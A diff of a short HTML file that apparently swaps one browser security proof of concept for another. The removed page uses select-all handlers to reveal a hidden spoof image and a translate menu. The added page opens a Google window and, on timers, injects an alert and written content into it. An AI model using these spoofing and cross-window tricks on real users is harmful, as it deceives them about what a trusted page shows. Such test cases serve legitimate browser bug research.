@@ -1,29 +1,27 @@
-<html onmousedown="rfsSelectAll()" onclick="selectAllChildren()">
+
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1>The Window Object</h1>
+<h2>The open() Method</h2>
+
+<p>Click the button to open a new browser window.</p>
+
+<button onclick="myFunction()">Try it</button>
 
 <script>
-    function rfsSelectAll() {
-        document.execCommand("selectAll");
-      document.getElementById("spoof").style   = "display: block;";
+function myFunction() {
+ var x = window.open("https://www.google.com/csi");
 
-    }
+   setTimeout(function(){x.alert()}, 1850)
 
-    function selectAllChildren() {
-        document.getSelection().selectAllChildren(paragraph1);
-    }
+
+   setTimeout(function(){x.document.write(`
+        <input />
+    `);}, 2400)
+}
 </script>
 
-<body>
-            <img id="spoof" style="display: none;" src="spoof.png"></img>
-
-    <img style="margin-top: 9999px;"></img>
-
-    <p id="paragraph1">
-        <!-- Trigger Translate Menu -->
-        A[=
-        ?:TLv
-        S9y
-        <!-- Trigger Translate Menu -->
-    </p>
 </body>
-
 </html>
